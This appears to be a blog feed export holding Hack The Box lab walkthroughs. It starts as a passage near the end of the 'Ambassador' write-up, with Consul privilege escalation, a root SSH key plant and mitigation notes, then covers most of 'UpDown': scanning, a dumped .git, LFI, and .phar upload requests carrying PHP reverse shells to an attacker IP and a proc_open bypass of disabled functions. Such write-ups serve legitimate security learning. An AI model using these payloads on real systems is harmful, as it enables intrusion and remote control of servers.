put-config-in-consul.sh # We use Consul for application config in production, this script will help set the correct values for the app# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before runningconsul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORDdeveloper@ambassador:/opt/my-app/whackywidget$ consul kv get whackywidget/db/mysql_pwError querying Consul agent: Unexpected response code: 403 (Permission denied: token with AccessorID '00000000-0000-0000-0000-000000000002' lacks permission 'key:read' on \"whackywidget/db/mysql_pw\")The script was adding a password to Consul. But I did not have permission to access it. Again, it needed to run as root. I kept looking on the server. I ran linPEAS on it. It found what I needed, but I missed it when looking at the results.Eventually, I was going back to the widget code to see if I missed something. I was using tab-tab to get Bash to autocomplete the paths for me. And when it displayed the list of folders in /opt/my-app, I saw what I had missed in linPEAS.developer@ambassador:~$ cd /opt/consul/ my-app/ developer@ambassador:~$ cd /opt/my-app/env/          .git/         whackywidget/ There was a .git folder. I changed the app folder and checked the Git history.developer@ambassador:~$ cd /opt/my-app/developer@ambassador:/opt/my-app$ git statusOn branch mainnothing to commit, working tree cleandeveloper@ambassador:/opt/my-app$ git logcommit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -&gt; main)Author: Developer &lt;developer@ambassador.local&gt;Date:   Sun Mar 13 23:47:36 2022 +0000    tidy config scriptcommit c982db8eff6f10f8f3a7d802f79f2705e7a21b55Author: Developer &lt;developer@ambassador.local&gt;Date:   Sun Mar 13 23:44:45 2022 +0000    config scriptcommit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6Author: Developer &lt;developer@ambassador.local&gt;Date:   Sun Mar 13 22:47:01 2022 +0000    created project with django CLIcommit 4b8597b167b2fbf8ec35f992224e612bf28d9e51Author: Developer &lt;developer@ambassador.local&gt;Date:   Sun Mar 13 22:44:11 2022 +0000    .gitignoredeveloper@ambassador:/opt/my-app$ git diff c982db8eff6f10f8f3a7d802f79f2705e7a21b55diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.shindex 35c08f6..fc51ec0 100755--- a/whackywidget/put-config-in-consul.sh+++ b/whackywidget/put-config-in-consul.sh@@ -1,4 +1,4 @@ # We use Consul for application config in production, this script will help set the correct values for the app-# Export MYSQL_PASSWORD before running+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running -consul kv put --token REDACTED whackywidget/db/mysql_pw $MYSQL_PASSWORDThe previous commit was using a token to set the password in Consul. I tried using the token to reload the configuration and it worked.Successdeveloper@ambassador:/opt/my-app$ consul reload --token REDACTEDConfiguration reload triggeredI had to copy my configuration again since the cleanup script had erased it. I reloaded again, and a few seconds later, I got a hit on my web server. I had code execution.$ python -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.129.228.56 - - [11/Nov/2022 15:10:07] code 404, message File not found10.129.228.56 - - [11/Nov/2022 15:10:07] \"GET /consul HTTP/1.1\" 404 -I modified the exploit script to open a reverse shell instead of sending a web request. A few seconds later, I got a hit on my netcat listener. I was connected as root, but the connection got closed immediately. I thought it was the timeout of 1 second that killed it so I changed it to 24 hours. But my connection got killed anyway.I could have tried to figure it out, but I thought it would be simpler to go another way. I changed the script to copy my SSH public key to root‚Äôs authorized keys.developer@ambassador:~$ cat /tmp/exploit.sh#!/bin/bashmkdir /root/.ssh/chmod 700 /root/.sshecho -n \"ssh-rsa AAAA...\" &gt; /root/.ssh/authorized_keyschmod 600 /root/.ssh/authorized_keysThen, I connected as root and read the flag.$ ssh root@target                                          The authenticity of host 'target (10.129.228.56)' can't be established.ED25519 key fingerprint is SHA256:zXkkXkOCX9Wg6pcH1yaG4zCZd5J25Co9TrlNWyChdZk.This key is not known by any other namesAre you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added 'target' (ED25519) to the list of known hosts.Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Fri 11 Nov 2022 08:18:23 PM UTC  System load:           0.15  Usage of /:            80.9% of 5.07GB  Memory usage:          49%  Swap usage:            0%  Processes:             236  Users logged in:       1  IPv4 address for eth0: 10.129.228.56  IPv6 address for eth0: dead:beef::250:56ff:feb9:dadc * Super-optimized for small spaces - read how we shrank the memory   footprint of MicroK8s to make it the smallest full K8s around.   https://ubuntu.com/blog/microk8s-memory-optimisation0 updates can be applied immediately.The list of available updates is more than a week old.To check for new updates run: sudo apt updateFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsLast login: Tue Sep 27 14:48:10 2022 from 10.10.14.6root@ambassador:~# lscleanup.sh  root.txt  snaproot@ambassador:~# cat root.txt REDACTEDMitigationThis machine was really fun. There were multiple vulnerabilities that I had to use to get to root, but they would be simple to fix if I wanted to make the box more secure.The first issue was with the version of Grafana. The version used has a known vulnerability, so it should have been updated. The admin password should also have been changed. I was not able to use my access to Grafana to gain access. But on a real server, this could allow an attacker to access sensitive data.Next, the MySQL port should not have been open on the internet. It should only be available to the servers that need access to it. In this case, localhost would have been enough. There was also a password stored in clear in that database. It should have been hashed, not encoded.Once on the machine, I should not have been allowed to write to the Consul configuration. Even without the ability to restart the service, on a real server, I could have waited for the server to reboot and get code execution then.Having the Git repository on the machine was also a problem. There is no reason to have the repository on the server. The deployment should only send the needed files.And if credentials are committed to a Git repository they should be invalided immediately. Removing them from the code is not enough. Anyone with access to the repo can see them, and use them if they are still valid."
  },
  
  {
    "title": "Hack The Box - UpDown",
    "url": "/2023/01/HTB/UpDown",
    "categories": "",
    "tags": "Walkthrough, Hacking, HackTheBox, Medium, Machine",
    "date": "2023-01-21 00:00:00 +0800",
    





    
    "snippet": "It took me a long time to get a foothold on that machine. But once I was in, getting the user and root was very easy.  Room: UpDown  Difficulty: Medium  URL: https://app.hackthebox.com/machines/UpD...",
    "content": "It took me a long time to get a foothold on that machine. But once I was in, getting the user and root was very easy.  Room: UpDown  Difficulty: Medium  URL: https://app.hackthebox.com/machines/UpDown  Author: AB2EnumerationAs always, I started by running Rustscan to find open ports.$ rustscan -a target -- -v | tee rust.txt.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| || .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'The Modern Day Port Scanner.________________________________________: https://discord.gg/GFrQsGy           :: https://github.com/RustScan/RustScan : --------------------------------------Nmap? More like slowmap.üê¢[~] The config file is expected to be at \"/home/ehogue/.rustscan.toml\"[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.Open 10.129.57.44:22Open 10.129.57.44:80[~] Starting Script(s)[&gt;] Script to be run Some(\"nmap -vvv -p  \")[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-17 07:30 EDTInitiating Ping Scan at 07:30Scanning 10.129.57.44 [2 ports]Completed Ping Scan at 07:30, 0.05s elapsed (1 total hosts)Initiating Connect Scan at 07:30Scanning target (10.129.57.44) [2 ports]Discovered open port 22/tcp on 10.129.57.44Discovered open port 80/tcp on 10.129.57.44Completed Connect Scan at 07:30, 0.03s elapsed (2 total ports)Nmap scan report for target (10.129.57.44)Host is up, received conn-refused (0.049s latency).Scanned at 2022-09-17 07:30:11 EDT for 0sPORT   STATE SERVICE REASON22/tcp open  ssh     syn-ack80/tcp open  http    syn-ackRead data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 0.13 secondsPorts 22 (SSH) and 80 (HTTP) were open.WebsiteThe website allowed checking if a website was up or not.There was also a debug feature that showed the HTML returned by the site being checked.When I saw the debug feature, I thought I could use it to do Server-Side Request Forgery (SSRF). I tried to use it to check for ports that were only available on the server.$ wfuzz -z range,1-65535 -d \"site=http://localhost:FUZZ&amp;debug=1\" --hw 99  http://target.htb /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://target.htb/Total requests: 65535=====================================================================ID           Response   Lines    Word       Chars       Payload=====================================================================000000080:   200        85 L     209 W      2561 Ch     \"80\"Total time: 0Processed Requests: 65535Filtered Requests: 65534Requests/sec.: 0It did not find anything. I launched Feroxbuster to look for hidden pages.$ feroxbuster -u http://target.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php  -n -o ferox.txt ___  ___  __   __     __      __         __   ___|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___by Ben \"epi\" Risher ü§ì                 ver: 2.7.0‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ üéØ  Target Url            ‚îÇ http://target.htb üöÄ  Threads               ‚îÇ 50 üìñ  Wordlist              ‚îÇ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt üëå  Status Codes          ‚îÇ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] üí•  Timeout (secs)        ‚îÇ 7 ü¶°  User-Agent            ‚îÇ feroxbuster/2.7.0 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml üíæ  Output File           ‚îÇ ferox.txt üí≤  Extensions            ‚îÇ [php] üèÅ  HTTP methods          ‚îÇ [GET] üö´  Do Not Recurse        ‚îÇ true üéâ  New Version Available ‚îÇ https://github.com/epi052/feroxbuster/releases/latest‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ üèÅ  Press [ENTER] to use the Scan Management Menu‚Ñ¢‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ403      GET        9l       28w      275c http://target.htb/.php403      GET        9l       28w      275c http://target.htb/.html200      GET       40l       93w     1131c http://target.htb/403      GET        9l       28w      275c http://target.htb/.html.php301      GET        9l       28w      306c http://target.htb/dev =&gt; http://target.htb/dev/200      GET       40l       93w     1131c http://target.htb/index.php403      GET        9l       28w      275c http://target.htb/.htaccess403      GET        9l       28w      275c http://target.htb/.htaccess.php403      GET        9l       28w      275c http://target.htb/.htm403      GET        9l       28w      275c http://target.htb/.htm.php403      GET        9l       28w      275c http://target.htb/.phtml403      GET        9l       28w      275c http://target.htb/.htc....There was a dev folder, I scanned it also.$ feroxbuster -u http://target.htb/dev/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php  -n -o feroxDev.txt ___  ___  __   __     __      __         __   ___|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___by Ben \"epi\" Risher ü§ì                 ver: 2.7.0‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ üéØ  Target Url            ‚îÇ http://target.htb/dev/ üöÄ  Threads               ‚îÇ 50 üìñ  Wordlist              ‚îÇ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt üëå  Status Codes          ‚îÇ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] üí•  Timeout (secs)        ‚îÇ 7 ü¶°  User-Agent            ‚îÇ feroxbuster/2.7.0 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml üíæ  Output File           ‚îÇ feroxDev.txt üí≤  Extensions            ‚îÇ [php] üèÅ  HTTP methods          ‚îÇ [GET] üö´  Do Not Recurse        ‚îÇ true üéâ  New Version Available ‚îÇ https://github.com/epi052/feroxbuster/releases/latest‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ üèÅ  Press [ENTER] to use the Scan Management Menu‚Ñ¢‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ403      GET        9l       28w      275c http://target.htb/dev/.php200      GET        0l        0w        0c http://target.htb/dev/403      GET        9l       28w      275c http://target.htb/dev/.html403      GET        9l       28w      275c http://target.htb/dev/.html.php403      GET        9l       28w      275c http://target.htb/dev/.htaccess403      GET        9l       28w      275c http://target.htb/dev/.htaccess.php200      GET        0l        0w        0c http://target.htb/dev/index.php403      GET        9l       28w      275c http://target.htb/dev/.phtml403      GET        9l       28w      275c http://target.htb/dev/.htm403      GET        9l       28w      275c http://target.htb/dev/.htm.php403      GET        9l       28w      275c http://target.htb/dev/.htc403      GET        9l       28w      275c http://target.htb/dev/.htc.php403      GET        9l       28w      275c http://target.htb/dev/.html_var_DE403      GET        9l       28w      275c http://target.htb/dev/.html_var_DE.php403      GET        9l       28w      275c http://target.htb/dev/.htpasswd403      GET        9l       28w      275c http://target.htb/dev/.htpasswd.php301      GET        9l       28w      311c http://target.htb/dev/.git =&gt; http://target.htb/dev/.git/403      GET        9l       28w      275c http://target.htb/dev/.html.403      GET        9l       28w      275c http://target.htb/dev/.html..php403      GET        9l       28w      275c http://target.htb/dev/.html.html403      GET        9l       28w      275c http://target.htb/dev/.html.html.php403      GET        9l       28w      275c http://target.htb/dev/.htpasswds...The dev folder contained a .git folder. So I used git-dumper to extract it.$ git-dumper http://target.htb/dev/.git/ siteCode/[-] Testing http://target.htb/dev/.git/HEAD [200][-] Testing http://target.htb/dev/.git/ [200][-] Fetching .git recursively[-] Fetching http://target.htb/dev/.gitignore [404][-] http://target.htb/dev/.gitignore responded with status code 404[-] Fetching http://target.htb/dev/.git/ [200][-] Fetching http://target.htb/dev/.git/packed-refs [200][-] Fetching http://target.htb/dev/.git/description [200][-] Fetching http://target.htb/dev/.git/branches/ [200][-] Fetching http://target.htb/dev/.git/config [200][-] Fetching http://target.htb/dev/.git/HEAD [200][-] Fetching http://target.htb/dev/.git/index [200][-] Fetching http://target.htb/dev/.git/hooks/ [200][-] Fetching http://target.htb/dev/.git/info/ [200][-] Fetching http://target.htb/dev/.git/objects/ [200][-] Fetching http://target.htb/dev/.git/refs/ [200][-] Fetching http://target.htb/dev/.git/info/exclude [200][-] Fetching http://target.htb/dev/.git/objects/info/ [200][-] Fetching http://target.htb/dev/.git/refs/heads/ [200][-] Fetching http://target.htb/dev/.git/objects/pack/ [200][-] Fetching http://target.htb/dev/.git/refs/tags/ [200][-] Fetching http://target.htb/dev/.git/refs/remotes/ [200][-] Fetching http://target.htb/dev/.git/hooks/applypatch-msg.sample [200][-] Fetching http://target.htb/dev/.git/hooks/fsmonitor-watchman.sample [200][-] Fetching http://target.htb/dev/.git/hooks/commit-msg.sample [200][-] Fetching http://target.htb/dev/.git/hooks/post-update.sample [200][-] Fetching http://target.htb/dev/.git/hooks/pre-applypatch.sample [200][-] Fetching http://target.htb/dev/.git/hooks/pre-commit.sample [200][-] Fetching http://target.htb/dev/.git/hooks/pre-merge-commit.sample [200][-] Fetching http://target.htb/dev/.git/hooks/pre-push.sample [200][-] Fetching http://target.htb/dev/.git/hooks/pre-rebase.sample [200][-] Fetching http://target.htb/dev/.git/hooks/pre-receive.sample [200][-] Fetching http://target.htb/dev/.git/hooks/prepare-commit-msg.sample [200][-] Fetching http://target.htb/dev/.git/hooks/push-to-checkout.sample [200][-] Fetching http://target.htb/dev/.git/hooks/update.sample [200][-] Fetching http://target.htb/dev/.git/refs/heads/main [200][-] Fetching http://target.htb/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.idx [200][-] Fetching http://target.htb/dev/.git/refs/remotes/origin/ [200][-] Fetching http://target.htb/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.pack [200][-] Fetching http://target.htb/dev/.git/refs/remotes/origin/HEAD [200][-] Fetching http://target.htb/dev/.git/logs/ [200][-] Fetching http://target.htb/dev/.git/logs/HEAD [200][-] Fetching http://target.htb/dev/.git/logs/refs/ [200][-] Fetching http://target.htb/dev/.git/logs/refs/heads/ [200][-] Fetching http://target.htb/dev/.git/logs/refs/remotes/ [200][-] Fetching http://target.htb/dev/.git/logs/refs/heads/main [200][-] Fetching http://target.htb/dev/.git/logs/refs/remotes/origin/ [200][-] Fetching http://target.htb/dev/.git/logs/refs/remotes/origin/HEAD [200][-] Running git checkout .Updated 6 paths from the indexThis hinted at a possible development site. It did not appear to be in /dev so I looked for subdomains.$ wfuzz -c -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -t30 --hw 93 -H \"Host:FUZZ.siteisup.htb\" \"http://siteisup.htb/\" /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://siteisup.htb/Total requests: 5000=====================================================================ID           Response   Lines    Word       Chars       Payload=====================================================================000000019:   403        9 L      28 W       281 Ch      \"dev\"000002700:   400        10 L     35 W       301 Ch      \"m.\"000002795:   400        10 L     35 W       301 Ch      \"ns2.cl.bellsouth.net.\"000002885:   400        10 L     35 W       301 Ch      \"ns2.viviotech.net.\"000002883:   400        10 L     35 W       301 Ch      \"ns1.viviotech.net.\"000003050:   400        10 L     35 W       301 Ch      \"ns3.cl.bellsouth.net.\"000004083:   400        10 L     35 W       301 Ch      \"quatro.oweb.com.\"000004082:   400        10 L     35 W       301 Ch      \"jordan.fortwayne.com.\"000004081:   400        10 L     35 W       301 Ch      \"ferrari.fortwayne.com.\"Total time: 6.349830Processed Requests: 5000Filtered Requests: 4991Requests/sec.: 787.4226It found dev.siteisup.htb, I added that to my hosts files. When I tried to visit it, I got a 403.I looked at the .htaccess from the source code and saw that the site required a header to be present.SetEnvIfNoCase Special-Dev \"only4dev\" Required-HeaderOrder Deny,AllowDeny from AllAllow from env=Required-HeaderI used Burp Proxy Map and Replace to always had that header to my requests.I reloaded the page, and this time I got a 200.This site was also checking if websites were online or not. But this one allowed uploading files with a list of sites to check.There was also an admin panel.The panel was empty, but the ?page=admin in the URL hinted at Local File Inclusion (LFI).The source code confirmed it was possible.&lt;?php\tdefine(\"DIRECTACCESS\",false);\t$page=$_GET['page'];\tif($page &amp;&amp; !preg_match(\"/bin|usr|home|var|etc/i\",$page)){\t\tinclude($_GET['page'] . \".php\");\t}else{\t\tinclude(\"checker.php\");\t}\t?&gt;There were some limitations, but I could include PHP files.I thought that I might be able to use the file upload functionality to upload a PHP file, then execute it with LFI vulnerability. But it was not that simple. The upload had some restrictions on the file extensions, PHP files were rejected. And it was deleting the uploaded files as soon as it was done.if($_POST['check']){  \t# File size must be less than 10kb.\tif ($_FILES['file']['size'] &gt; 10000) {        die(\"File too large!\");    }\t$file = $_FILES['file']['name'];\t\t# Check if extension is allowed.\t$ext = getExtension($file);\tif(preg_match(\"/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i\",$ext)){\t\tdie(\"Extension not allowed!\");\t}  \t# Create directory to upload our file.\t$dir = \"uploads/\".md5(time()).\"/\";\tif(!is_dir($dir)){        mkdir($dir, 0770, true);    }    # Upload the file.\t$final_path = $dir.$file;\tmove_uploaded_file($_FILES['file']['tmp_name'], \"{$final_path}\");\t  # Read the uploaded file.\t$websites = explode(\"\\n\",file_get_contents($final_path));\t\tforeach($websites as $site){\t\t$site=trim($site);\t\tif(!preg_match(\"#file://#i\",$site) &amp;&amp; !preg_match(\"#data://#i\",$site) &amp;&amp; !preg_match(\"#ftp://#i\",$site)){\t\t\t$check=isitup($site);\t\t\tif($check){\t\t\t\techo \"&lt;center&gt;{$site}&lt;br&gt;&lt;font color='green'&gt;is up ^_^&lt;/font&gt;&lt;/center&gt;\";\t\t\t}else{\t\t\t\techo \"&lt;center&gt;{$site}&lt;br&gt;&lt;font color='red'&gt;seems to be down :(&lt;/font&gt;&lt;/center&gt;\";\t\t\t}\t\t\t}else{\t\t\techo \"&lt;center&gt;&lt;font color='red'&gt;Hacking attempt was detected !&lt;/font&gt;&lt;/center&gt;\";\t\t}\t}\t  # Delete the uploaded file.\t@unlink($final_path);}It was also uploading files to a different folder every time. Luckily, directory listing was not disabled on the uploads folder, so I did not need to guess the folders where my files were being uploaded. I also did not need to use the LFI to execute PHP code if I were to find a way to upload a PHP file.The deleting of the file could have been an issue, but I quickly found a way around that.function isitup($url){\t$ch=curl_init();\tcurl_setopt($ch, CURLOPT_URL, trim($url));\tcurl_setopt($ch, CURLOPT_USERAGENT, \"siteisup.htb beta\");\tcurl_setopt($ch, CURLOPT_HEADER, 1);\tcurl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);\tcurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\tcurl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);\tcurl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);\tcurl_setopt($ch, CURLOPT_TIMEOUT, 30);\t$f = curl_exec($ch);\t$header = curl_getinfo($ch);\tif($f AND $header['http_code'] == 200){\t\treturn array(true,$f);\t}else{\t\treturn false;\t}    curl_close($ch);}The code was using Curl to check if the websites were up. And it had a 30 seconds timeout. Hack The Box machines do not have access to the internet, so if I tried to check on any sites, it would hang for 30 seconds before deleting the file. I could add more lines if I needed more time.POST / HTTP/1.1Host: dev.siteisup.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------27067171744469957932680288557Content-Length: 387Origin: http://dev.siteisup.htbConnection: closeReferer: http://dev.siteisup.htb/Upgrade-Insecure-Requests: 1Special-Dev: only4dev-----------------------------27067171744469957932680288557Content-Disposition: form-data; name=\"file\"; filename=\"test.txt\"Content-Type: text/plainhttps://app.hackthebox.comhttps://app.hackthebox.com-----------------------------27067171744469957932680288557Content-Disposition: form-data; name=\"check\"Check-----------------------------27067171744469957932680288557--The code was blocking PHP files. But PHP supports many extensions. I found out I could upload .phar files and they were executed.POST / HTTP/1.1Host: dev.siteisup.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------27067171744469957932680288557Content-Length: 384Origin: http://dev.siteisup.htbConnection: closeReferer: http://dev.siteisup.htb/Upgrade-Insecure-Requests: 1Special-Dev: only4dev-----------------------------27067171744469957932680288557Content-Disposition: form-data; name=\"file\"; filename=\"test.phar\"Content-Type: text/plain&lt;?phpecho 'RCE&lt;br /&gt;';?&gt;https://app.hackthebox.com-----------------------------27067171744469957932680288557Content-Disposition: form-data; name=\"check\"Check-----------------------------27067171744469957932680288557--At this point, I thought I had an easy reverse shell.POST / HTTP/1.1Host: dev.siteisup.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------27067171744469957932680288557Content-Length: 428Origin: http://dev.siteisup.htbConnection: closeReferer: http://dev.siteisup.htb/Upgrade-Insecure-Requests: 1Special-Dev: only4dev-----------------------------27067171744469957932680288557Content-Disposition: form-data; name=\"file\"; filename=\"test.phar\"Content-Type: text/plain&lt;?php`bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.6/4444 0&gt;&amp;1'`;?&gt;https://app.hackthebox.com-----------------------------27067171744469957932680288557Content-Disposition: form-data; name=\"check\"Check-----------------------------27067171744469957932680288557--I sent a phar file with the reverse shell and opened it, but it failed. I tried different reverse shells, they all failed.I changed my code to execute phpinfo(). This showed me why my reverse shells were all failing.The functions I was using to get the shell were all disabled by PHP configuration. I tried to use ini_set to enable them. But they cannot be enabled at runtime.I tried other things, I used PHP to list the files and folders on the machine. I tried reading many files but did not find anything. I tried reading the user‚Äôs ssh key but did not have access. I got stuck at this point. I left the machine aside and worked on others for a while.Finally a ShellWhen I came back to this box, I tried to bypass the disabled functions again. I tried a few things I found, but none of them worked.I came across a Python script that took the output of phpinfo() and checked for functions that are not disabled and can be exploited. The code failed to parse the list of functions. It‚Äôs 3 years old and the format might have changed. I hardcoded the list of functions directly in the code and ran it.$ python2 dfunc-bypasser.py --url http://dev.siteisup.htb/uploads/test.php                                ,---,                                       .'  .' `\\                                     ,---.'     \\                                    |   |  .`\\  |                                   :   : |  '  |                                   |   ' '  ;  :                                   '   | ;  .  |                                   |   | :  |  '                                   '   : | /  ;                                    |   | '` ,/                                     ;   :  .'                                       |   ,.'                                         '---'                                 authors: __c3rb3ru5__, $_SpyD3r_$Please add the following functions in your disable_functions option: proc_openIf PHP-FPM is there stream_socket_sendto,stream_socket_client,fsockopen can also be used to be exploit by poisoning the request to the unix socketproc_open was not disabled. I found a small script that showed how to exploit it to run commands on the server.I used it to get a shell on the server.POST / HTTP/1.1Host: dev.siteisup.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------27067171744469957932680288557Content-Length: 1006Origin: http://dev.siteisup.htbConnection: closeReferer: http://dev.siteisup.htb/Upgrade-Insecure-Requests: 1Special-Dev: only4dev-----------------------------27067171744469957932680288557Content-Disposition: form-data; name=\"file\"; filename=\"test.phar\"Content-Type: text/plain&lt;?php$descriptorspec = array(   0=&gt; array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from   1=&gt; array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to   2=&gt; array(\"file\", \"/tmp/error-output.txt\", \"a\") // stderr is a file to write to);$process = proc_open('sh', $descriptorspec, $pipes, $cwd, $env);if (is_resource($process)) {    fwrite($pipes[0], \"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.6/4444 0&gt;&amp;1'\");    fclose($pipes[0]);    echo stream_get_contents($pipes[1]);    fclose($pipes[1]);    $return_value = proc_close($process);     echo \"command returned $return_value\\n\";}?&gt;https://app.hackthebox.com-----------------------------27067171744469957932680288557Content-Disposition: form-data; name=\"check\"Check-----------------------------27067171744469957932680288557--I was finally in.$ nc -klvnp 